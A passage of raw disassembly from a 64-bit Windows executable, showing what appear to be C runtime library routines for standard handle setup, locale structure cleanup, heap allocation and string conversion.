   140007a99:	48 83 ef 01          	sub    $0x1,%rdi
   140007a9d:	75 a3                	jne    0x140007a42
   140007a9f:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140007aa6:	00 
   140007aa7:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140007aab:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140007aaf:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140007ab3:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140007ab7:	49 8b e3             	mov    %r11,%rsp
   140007aba:	41 5e                	pop    %r14
   140007abc:	c3                   	ret
   140007abd:	cc                   	int3
   140007abe:	cc                   	int3
   140007abf:	cc                   	int3
   140007ac0:	48 8b c4             	mov    %rsp,%rax
   140007ac3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140007ac7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140007acb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140007acf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007ad3:	41 56                	push   %r14
   140007ad5:	48 83 ec 20          	sub    $0x20,%rsp
   140007ad9:	33 f6                	xor    %esi,%esi
   140007adb:	45 33 f6             	xor    %r14d,%r14d
   140007ade:	48 63 ce             	movslq %esi,%rcx
   140007ae1:	48 8d 3d 68 05 01 00 	lea    0x10568(%rip),%rdi        # 0x140018050
   140007ae8:	48 8b c1             	mov    %rcx,%rax
   140007aeb:	83 e1 3f             	and    $0x3f,%ecx
   140007aee:	48 c1 f8 06          	sar    $0x6,%rax
   140007af2:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140007af6:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140007afa:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140007aff:	48 83 c0 02          	add    $0x2,%rax
   140007b03:	48 83 f8 01          	cmp    $0x1,%rax
   140007b07:	76 0a                	jbe    0x140007b13
   140007b09:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140007b0e:	e9 8f 00 00 00       	jmp    0x140007ba2
   140007b13:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140007b18:	8b ce                	mov    %esi,%ecx
   140007b1a:	85 f6                	test   %esi,%esi
   140007b1c:	74 16                	je     0x140007b34
   140007b1e:	83 e9 01             	sub    $0x1,%ecx
   140007b21:	74 0a                	je     0x140007b2d
   140007b23:	83 f9 01             	cmp    $0x1,%ecx
   140007b26:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140007b2b:	eb 0c                	jmp    0x140007b39
   140007b2d:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140007b32:	eb 05                	jmp    0x140007b39
   140007b34:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140007b39:	ff 15 b9 65 00 00    	call   *0x65b9(%rip)        # 0x14000e0f8
   140007b3f:	48 8b e8             	mov    %rax,%rbp
   140007b42:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140007b46:	48 83 f9 01          	cmp    $0x1,%rcx
   140007b4a:	76 0b                	jbe    0x140007b57
   140007b4c:	48 8b c8             	mov    %rax,%rcx
   140007b4f:	ff 15 63 66 00 00    	call   *0x6663(%rip)        # 0x14000e1b8
   140007b55:	eb 02                	jmp    0x140007b59
   140007b57:	33 c0                	xor    %eax,%eax
   140007b59:	85 c0                	test   %eax,%eax
   140007b5b:	74 20                	je     0x140007b7d
   140007b5d:	0f b6 c8             	movzbl %al,%ecx
   140007b60:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
   140007b65:	83 f9 02             	cmp    $0x2,%ecx
   140007b68:	75 07                	jne    0x140007b71
   140007b6a:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007b6f:	eb 31                	jmp    0x140007ba2
   140007b71:	83 f9 03             	cmp    $0x3,%ecx
   140007b74:	75 2c                	jne    0x140007ba2
   140007b76:	80 4c df 38 08       	orb    $0x8,0x38(%rdi,%rbx,8)
   140007b7b:	eb 25                	jmp    0x140007ba2
   140007b7d:	80 4c df 38 40       	orb    $0x40,0x38(%rdi,%rbx,8)
   140007b82:	48 c7 44 df 28 fe ff 	movq   $0xfffffffffffffffe,0x28(%rdi,%rbx,8)
   140007b89:	ff ff 
   140007b8b:	48 8b 05 be 0a 01 00 	mov    0x10abe(%rip),%rax        # 0x140018650
   140007b92:	48 85 c0             	test   %rax,%rax
   140007b95:	74 0b                	je     0x140007ba2
   140007b97:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140007b9b:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   140007ba2:	ff c6                	inc    %esi
   140007ba4:	49 83 c6 08          	add    $0x8,%r14
   140007ba8:	83 fe 03             	cmp    $0x3,%esi
   140007bab:	0f 85 2d ff ff ff    	jne    0x140007ade
   140007bb1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007bb6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007bbb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007bc0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140007bc5:	48 83 c4 20          	add    $0x20,%rsp
   140007bc9:	41 5e                	pop    %r14
   140007bcb:	c3                   	ret
   140007bcc:	40 53                	rex push %rbx
   140007bce:	48 83 ec 20          	sub    $0x20,%rsp
   140007bd2:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007bd7:	e8 08 fa ff ff       	call   0x1400075e4
   140007bdc:	33 db                	xor    %ebx,%ebx
   140007bde:	33 c9                	xor    %ecx,%ecx
   140007be0:	e8 a3 fb ff ff       	call   0x140007788
   140007be5:	85 c0                	test   %eax,%eax
   140007be7:	75 0c                	jne    0x140007bf5
   140007be9:	e8 e2 fd ff ff       	call   0x1400079d0
   140007bee:	e8 cd fe ff ff       	call   0x140007ac0
   140007bf3:	b3 01                	mov    $0x1,%bl
   140007bf5:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007bfa:	e8 39 fa ff ff       	call   0x140007638
   140007bff:	8a c3                	mov    %bl,%al
   140007c01:	48 83 c4 20          	add    $0x20,%rsp
   140007c05:	5b                   	pop    %rbx
   140007c06:	c3                   	ret
   140007c07:	cc                   	int3
   140007c08:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007c0d:	57                   	push   %rdi
   140007c0e:	48 83 ec 20          	sub    $0x20,%rsp
   140007c12:	33 db                	xor    %ebx,%ebx
   140007c14:	48 8d 3d 35 04 01 00 	lea    0x10435(%rip),%rdi        # 0x140018050
   140007c1b:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140007c1f:	48 85 c9             	test   %rcx,%rcx
   140007c22:	74 0a                	je     0x140007c2e
   140007c24:	e8 0f fb ff ff       	call   0x140007738
   140007c29:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140007c2e:	48 83 c3 08          	add    $0x8,%rbx
   140007c32:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140007c39:	72 d9                	jb     0x140007c14
   140007c3b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007c40:	b0 01                	mov    $0x1,%al
   140007c42:	48 83 c4 20          	add    $0x20,%rsp
   140007c46:	5f                   	pop    %rdi
   140007c47:	c3                   	ret
   140007c48:	48 85 c9             	test   %rcx,%rcx
   140007c4b:	0f 84 00 01 00 00    	je     0x140007d51
   140007c51:	53                   	push   %rbx
   140007c52:	48 83 ec 20          	sub    $0x20,%rsp
   140007c56:	48 8b d9             	mov    %rcx,%rbx
   140007c59:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140007c5d:	48 3b 0d c4 fa 00 00 	cmp    0xfac4(%rip),%rcx        # 0x140017728
   140007c64:	74 05                	je     0x140007c6b
   140007c66:	e8 ed db ff ff       	call   0x140005858
   140007c6b:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   140007c6f:	48 3b 0d ba fa 00 00 	cmp    0xfaba(%rip),%rcx        # 0x140017730
   140007c76:	74 05                	je     0x140007c7d
   140007c78:	e8 db db ff ff       	call   0x140005858
   140007c7d:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140007c81:	48 3b 0d b0 fa 00 00 	cmp    0xfab0(%rip),%rcx        # 0x140017738
   140007c88:	74 05                	je     0x140007c8f
   140007c8a:	e8 c9 db ff ff       	call   0x140005858
   140007c8f:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   140007c93:	48 3b 0d a6 fa 00 00 	cmp    0xfaa6(%rip),%rcx        # 0x140017740
   140007c9a:	74 05                	je     0x140007ca1
   140007c9c:	e8 b7 db ff ff       	call   0x140005858
   140007ca1:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140007ca5:	48 3b 0d 9c fa 00 00 	cmp    0xfa9c(%rip),%rcx        # 0x140017748
   140007cac:	74 05                	je     0x140007cb3
   140007cae:	e8 a5 db ff ff       	call   0x140005858
   140007cb3:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   140007cb7:	48 3b 0d 92 fa 00 00 	cmp    0xfa92(%rip),%rcx        # 0x140017750
   140007cbe:	74 05                	je     0x140007cc5
   140007cc0:	e8 93 db ff ff       	call   0x140005858
   140007cc5:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140007cc9:	48 3b 0d 88 fa 00 00 	cmp    0xfa88(%rip),%rcx        # 0x140017758
   140007cd0:	74 05                	je     0x140007cd7
   140007cd2:	e8 81 db ff ff       	call   0x140005858
   140007cd7:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140007cdb:	48 3b 0d 96 fa 00 00 	cmp    0xfa96(%rip),%rcx        # 0x140017778
   140007ce2:	74 05                	je     0x140007ce9
   140007ce4:	e8 6f db ff ff       	call   0x140005858
   140007ce9:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140007ced:	48 3b 0d 8c fa 00 00 	cmp    0xfa8c(%rip),%rcx        # 0x140017780
   140007cf4:	74 05                	je     0x140007cfb
   140007cf6:	e8 5d db ff ff       	call   0x140005858
   140007cfb:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140007cff:	48 3b 0d 82 fa 00 00 	cmp    0xfa82(%rip),%rcx        # 0x140017788
   140007d06:	74 05                	je     0x140007d0d
   140007d08:	e8 4b db ff ff       	call   0x140005858
   140007d0d:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   140007d14:	48 3b 0d 75 fa 00 00 	cmp    0xfa75(%rip),%rcx        # 0x140017790
   140007d1b:	74 05                	je     0x140007d22
   140007d1d:	e8 36 db ff ff       	call   0x140005858
   140007d22:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140007d29:	48 3b 0d 68 fa 00 00 	cmp    0xfa68(%rip),%rcx        # 0x140017798
   140007d30:	74 05                	je     0x140007d37
   140007d32:	e8 21 db ff ff       	call   0x140005858
   140007d37:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   140007d3e:	48 3b 0d 5b fa 00 00 	cmp    0xfa5b(%rip),%rcx        # 0x1400177a0
   140007d45:	74 05                	je     0x140007d4c
   140007d47:	e8 0c db ff ff       	call   0x140005858
   140007d4c:	48 83 c4 20          	add    $0x20,%rsp
   140007d50:	5b                   	pop    %rbx
   140007d51:	c3                   	ret
   140007d52:	cc                   	int3
   140007d53:	cc                   	int3
   140007d54:	48 85 c9             	test   %rcx,%rcx
   140007d57:	74 66                	je     0x140007dbf
   140007d59:	53                   	push   %rbx
   140007d5a:	48 83 ec 20          	sub    $0x20,%rsp
   140007d5e:	48 8b d9             	mov    %rcx,%rbx
   140007d61:	48 8b 09             	mov    (%rcx),%rcx
   140007d64:	48 3b 0d a5 f9 00 00 	cmp    0xf9a5(%rip),%rcx        # 0x140017710
   140007d6b:	74 05                	je     0x140007d72
   140007d6d:	e8 e6 da ff ff       	call   0x140005858
   140007d72:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007d76:	48 3b 0d 9b f9 00 00 	cmp    0xf99b(%rip),%rcx        # 0x140017718
   140007d7d:	74 05                	je     0x140007d84
   140007d7f:	e8 d4 da ff ff       	call   0x140005858
   140007d84:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140007d88:	48 3b 0d 91 f9 00 00 	cmp    0xf991(%rip),%rcx        # 0x140017720
   140007d8f:	74 05                	je     0x140007d96
   140007d91:	e8 c2 da ff ff       	call   0x140005858
   140007d96:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140007d9a:	48 3b 0d c7 f9 00 00 	cmp    0xf9c7(%rip),%rcx        # 0x140017768
   140007da1:	74 05                	je     0x140007da8
   140007da3:	e8 b0 da ff ff       	call   0x140005858
   140007da8:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140007dac:	48 3b 0d bd f9 00 00 	cmp    0xf9bd(%rip),%rcx        # 0x140017770
   140007db3:	74 05                	je     0x140007dba
   140007db5:	e8 9e da ff ff       	call   0x140005858
   140007dba:	48 83 c4 20          	add    $0x20,%rsp
   140007dbe:	5b                   	pop    %rbx
   140007dbf:	c3                   	ret
   140007dc0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007dc5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007dca:	57                   	push   %rdi
   140007dcb:	48 83 ec 20          	sub    $0x20,%rsp
   140007dcf:	33 ff                	xor    %edi,%edi
   140007dd1:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   140007dd5:	48 8b d9             	mov    %rcx,%rbx
   140007dd8:	48 8b f2             	mov    %rdx,%rsi
   140007ddb:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   140007de2:	ff ff 1f 
   140007de5:	48 23 f1             	and    %rcx,%rsi
   140007de8:	48 3b d8             	cmp    %rax,%rbx
   140007deb:	48 0f 47 f7          	cmova  %rdi,%rsi
   140007def:	48 85 f6             	test   %rsi,%rsi
   140007df2:	74 14                	je     0x140007e08
   140007df4:	48 8b 0b             	mov    (%rbx),%rcx
   140007df7:	e8 5c da ff ff       	call   0x140005858
   140007dfc:	48 ff c7             	inc    %rdi
   140007dff:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140007e03:	48 3b fe             	cmp    %rsi,%rdi
   140007e06:	75 ec                	jne    0x140007df4
   140007e08:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007e0d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007e12:	48 83 c4 20          	add    $0x20,%rsp
   140007e16:	5f                   	pop    %rdi
   140007e17:	c3                   	ret
   140007e18:	48 85 c9             	test   %rcx,%rcx
   140007e1b:	0f 84 fe 00 00 00    	je     0x140007f1f
   140007e21:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007e26:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140007e2b:	56                   	push   %rsi
   140007e2c:	48 83 ec 20          	sub    $0x20,%rsp
   140007e30:	bd 07 00 00 00       	mov    $0x7,%ebp
   140007e35:	48 8b d9             	mov    %rcx,%rbx
   140007e38:	8b d5                	mov    %ebp,%edx
   140007e3a:	e8 81 ff ff ff       	call   0x140007dc0
   140007e3f:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   140007e43:	8b d5                	mov    %ebp,%edx
   140007e45:	e8 76 ff ff ff       	call   0x140007dc0
   140007e4a:	8d 75 05             	lea    0x5(%rbp),%esi
   140007e4d:	8b d6                	mov    %esi,%edx
   140007e4f:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   140007e53:	e8 68 ff ff ff       	call   0x140007dc0
   140007e58:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   140007e5f:	8b d6                	mov    %esi,%edx
   140007e61:	e8 5a ff ff ff       	call   0x140007dc0
   140007e66:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   140007e6d:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140007e70:	e8 4b ff ff ff       	call   0x140007dc0
   140007e75:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   140007e7c:	e8 d7 d9 ff ff       	call   0x140005858
   140007e81:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140007e88:	e8 cb d9 ff ff       	call   0x140005858
   140007e8d:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   140007e94:	e8 bf d9 ff ff       	call   0x140005858
   140007e99:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   140007ea0:	8b d5                	mov    %ebp,%edx
   140007ea2:	e8 19 ff ff ff       	call   0x140007dc0
   140007ea7:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   140007eae:	8b d5                	mov    %ebp,%edx
   140007eb0:	e8 0b ff ff ff       	call   0x140007dc0
   140007eb5:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   140007ebc:	8b d6                	mov    %esi,%edx
   140007ebe:	e8 fd fe ff ff       	call   0x140007dc0
   140007ec3:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   140007eca:	8b d6                	mov    %esi,%edx
   140007ecc:	e8 ef fe ff ff       	call   0x140007dc0
   140007ed1:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   140007ed8:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140007edb:	e8 e0 fe ff ff       	call   0x140007dc0
   140007ee0:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   140007ee7:	e8 6c d9 ff ff       	call   0x140005858
   140007eec:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   140007ef3:	e8 60 d9 ff ff       	call   0x140005858
   140007ef8:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   140007eff:	e8 54 d9 ff ff       	call   0x140005858
   140007f04:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   140007f0b:	e8 48 d9 ff ff       	call   0x140005858
   140007f10:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007f15:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007f1a:	48 83 c4 20          	add    $0x20,%rsp
   140007f1e:	5e                   	pop    %rsi
   140007f1f:	c3                   	ret
   140007f20:	48 83 ec 28          	sub    $0x28,%rsp
   140007f24:	e8 bb d2 ff ff       	call   0x1400051e4
   140007f29:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140007f2e:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   140007f35:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140007f3a:	48 8b c8             	mov    %rax,%rcx
   140007f3d:	e8 32 17 00 00       	call   0x140009674
   140007f42:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140007f47:	48 8b 00             	mov    (%rax),%rax
   140007f4a:	48 83 c4 28          	add    $0x28,%rsp
   140007f4e:	c3                   	ret
   140007f4f:	cc                   	int3
   140007f50:	40 53                	rex push %rbx
   140007f52:	48 83 ec 20          	sub    $0x20,%rsp
   140007f56:	48 8b d9             	mov    %rcx,%rbx
   140007f59:	48 83 f9 e0          	cmp    $0xffffffffffffffe0,%rcx
   140007f5d:	77 3c                	ja     0x140007f9b
   140007f5f:	48 85 c9             	test   %rcx,%rcx
   140007f62:	b8 01 00 00 00       	mov    $0x1,%eax
   140007f67:	48 0f 44 d8          	cmove  %rax,%rbx
   140007f6b:	eb 15                	jmp    0x140007f82
   140007f6d:	e8 fe c6 ff ff       	call   0x140004670
   140007f72:	85 c0                	test   %eax,%eax
   140007f74:	74 25                	je     0x140007f9b
   140007f76:	48 8b cb             	mov    %rbx,%rcx
   140007f79:	e8 c6 0d 00 00       	call   0x140008d44
   140007f7e:	85 c0                	test   %eax,%eax
   140007f80:	74 19                	je     0x140007f9b
   140007f82:	48 8b 0d 8f 06 01 00 	mov    0x1068f(%rip),%rcx        # 0x140018618
   140007f89:	4c 8b c3             	mov    %rbx,%r8
   140007f8c:	33 d2                	xor    %edx,%edx
   140007f8e:	ff 15 ac 61 00 00    	call   *0x61ac(%rip)        # 0x14000e140
   140007f94:	48 85 c0             	test   %rax,%rax
   140007f97:	74 d4                	je     0x140007f6d
   140007f99:	eb 0d                	jmp    0x140007fa8
   140007f9b:	e8 20 d8 ff ff       	call   0x1400057c0
   140007fa0:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   140007fa6:	33 c0                	xor    %eax,%eax
   140007fa8:	48 83 c4 20          	add    $0x20,%rsp
   140007fac:	5b                   	pop    %rbx
   140007fad:	c3                   	ret
   140007fae:	cc                   	int3
   140007faf:	cc                   	int3
   140007fb0:	40 55                	rex push %rbp
   140007fb2:	41 54                	push   %r12
   140007fb4:	41 55                	push   %r13
   140007fb6:	41 56                	push   %r14
   140007fb8:	41 57                	push   %r15
   140007fba:	48 83 ec 60          	sub    $0x60,%rsp
   140007fbe:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140007fc3:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   140007fc7:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   140007fcb:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   140007fcf:	48 8b 05 52 f0 00 00 	mov    0xf052(%rip),%rax        # 0x140017028
   140007fd6:	48 33 c5             	xor    %rbp,%rax
   140007fd9:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140007fdd:	44 8b ea             	mov    %edx,%r13d
   140007fe0:	45 8b f9             	mov    %r9d,%r15d
   140007fe3:	48 8b d1             	mov    %rcx,%rdx
   140007fe6:	4d 8b e0             	mov    %r8,%r12
   140007fe9:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140007fed:	e8 22 cd ff ff       	call   0x140004d14
   140007ff2:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   140007ff8:	85 ff                	test   %edi,%edi
   140007ffa:	75 07                	jne    0x140008003
   140007ffc:	48 8b 45 08          	mov    0x8(%rbp),%rax
   140008000:	8b 78 0c             	mov    0xc(%rax),%edi
   140008003:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   140008009:	45 8b cf             	mov    %r15d,%r9d
   14000800c:	4d 8b c4             	mov    %r12,%r8
   14000800f:	8b cf                	mov    %edi,%ecx
   140008011:	1b d2                	sbb    %edx,%edx
   140008013:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140008018:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000801e:	83 e2 08             	and    $0x8,%edx
   140008021:	ff c2                	inc    %edx
   140008023:	e8 54 ef ff ff       	call   0x140006f7c
   140008028:	4c 63 f0             	movslq %eax,%r14
   14000802b:	85 c0                	test   %eax,%eax
   14000802d:	75 07                	jne    0x140008036
   14000802f:	33 ff                	xor    %edi,%edi
   140008031:	e9 ce 00 00 00       	jmp    0x140008104
   140008036:	49 8b f6             	mov    %r14,%rsi
   140008039:	48 03 f6             	add    %rsi,%rsi
   14000803c:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140008040:	48 3b f0             	cmp    %rax,%rsi
   140008043:	48 1b c9             	sbb    %rcx,%rcx
   140008046:	48 23 c8             	and    %rax,%rcx
   140008049:	74 53                	je     0x14000809e
   14000804b:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   140008052:	77 31                	ja     0x140008085
   140008054:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008058:	48 3b c1             	cmp    %rcx,%rax
   14000805b:	77 0a                	ja     0x140008067
   14000805d:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   140008064:	ff ff 0f 
   140008067:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   14000806b:	e8 20 57 00 00       	call   0x14000d790
   140008070:	48 2b e0             	sub    %rax,%rsp
   140008073:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140008078:	48 85 db             	test   %rbx,%rbx
   14000807b:	74 6f                	je     0x1400080ec
   14000807d:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   140008083:	eb 13                	jmp    0x140008098
   140008085:	e8 c6 fe ff ff       	call   0x140007f50
   14000808a:	48 8b d8             	mov    %rax,%rbx
   14000808d:	48 85 c0             	test   %rax,%rax
   140008090:	74 0e                	je     0x1400080a0
   140008092:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140008098:	48 83 c3 10          	add    $0x10,%rbx
   14000809c:	eb 02                	jmp    0x1400080a0
   14000809e:	33 db                	xor    %ebx,%ebx
   1400080a0:	48 85 db             	test   %rbx,%rbx
   1400080a3:	74 47                	je     0x1400080ec
   1400080a5:	4c 8b c6             	mov    %rsi,%r8
   1400080a8:	33 d2                	xor    %edx,%edx
   1400080aa:	48 8b cb             	mov    %rbx,%rcx
   1400080ad:	e8 ce a8 ff ff       	call   0x140002980
   1400080b2:	45 8b cf             	mov    %r15d,%r9d
   1400080b5:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400080ba:	4d 8b c4             	mov    %r12,%r8
   1400080bd:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400080c2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400080c7:	8b cf                	mov    %edi,%ecx
   1400080c9:	e8 ae ee ff ff       	call   0x140006f7c
   1400080ce:	85 c0                	test   %eax,%eax
   1400080d0:	74 1a                	je     0x1400080ec
   1400080d2:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   1400080d9:	44 8b c0             	mov    %eax,%r8d
   1400080dc:	48 8b d3             	mov    %rbx,%rdx
   1400080df:	41 8b cd             	mov    %r13d,%ecx
   1400080e2:	ff 15 d8 60 00 00    	call   *0x60d8(%rip)        # 0x14000e1c0
   1400080e8:	8b f8                	mov    %eax,%edi
   1400080ea:	eb 02                	jmp    0x1400080ee
   1400080ec:	33 ff                	xor    %edi,%edi
   1400080ee:	48 85 db             	test   %rbx,%rbx
   1400080f1:	74 11                	je     0x140008104
   1400080f3:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   1400080f7:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400080fd:	75 05                	jne    0x140008104
   1400080ff:	e8 54 d7 ff ff       	call   0x140005858
   140008104:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   140008108:	74 0b                	je     0x140008115
   14000810a:	48 8b 45 00          	mov    0x0(%rbp),%rax
   14000810e:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   140008115:	8b c7                	mov    %edi,%eax
   140008117:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000811b:	48 33 cd             	xor    %rbp,%rcx
   14000811e:	e8 cd 52 00 00       	call   0x14000d3f0
   140008123:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   140008127:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   14000812b:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   14000812f:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   140008133:	41 5f                	pop    %r15
   140008135:	41 5e                	pop    %r14
   140008137:	41 5d                	pop    %r13
   140008139:	41 5c                	pop    %r12
   14000813b:	5d                   	pop    %rbp
   14000813c:	c3                   	ret
   14000813d:	cc                   	int3
   14000813e:	cc                   	int3
   14000813f:	cc                   	int3
   140008140:	f0 ff 41 10          	lock incl 0x10(%rcx)
   140008144:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   14000814b:	48 85 c0             	test   %rax,%rax
   14000814e:	74 03                	je     0x140008153
   140008150:	f0 ff 00             	lock incl (%rax)
   140008153:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   14000815a:	48 85 c0             	test   %rax,%rax
   14000815d:	74 03                	je     0x140008162
   14000815f:	f0 ff 00             	lock incl (%rax)
   140008162:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008169:	48 85 c0             	test   %rax,%rax
   14000816c:	74 03                	je     0x140008171
   14000816e:	f0 ff 00             	lock incl (%rax)
   140008171:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008178:	48 85 c0             	test   %rax,%rax
   14000817b:	74 03                	je     0x140008180
   14000817d:	f0 ff 00             	lock incl (%rax)
   140008180:	48 8d 41 38          	lea    0x38(%rcx),%rax
   140008184:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000818a:	48 8d 15 77 f5 00 00 	lea    0xf577(%rip),%rdx        # 0x140017708
   140008191:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   140008195:	74 0b                	je     0x1400081a2
   140008197:	48 8b 10             	mov    (%rax),%rdx
   14000819a:	48 85 d2             	test   %rdx,%rdx
   14000819d:	74 03                	je     0x1400081a2
   14000819f:	f0 ff 02             	lock incl (%rdx)
   1400081a2:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   1400081a7:	74 0c                	je     0x1400081b5
   1400081a9:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   1400081ad:	48 85 d2             	test   %rdx,%rdx
   1400081b0:	74 03                	je     0x1400081b5
   1400081b2:	f0 ff 02             	lock incl (%rdx)
   1400081b5:	48 83 c0 20          	add    $0x20,%rax
   1400081b9:	49 83 e8 01          	sub    $0x1,%r8
   1400081bd:	75 cb                	jne    0x14000818a
   1400081bf:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   1400081c6:	e9 79 01 00 00       	jmp    0x140008344
   1400081cb:	cc                   	int3
   1400081cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400081d1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
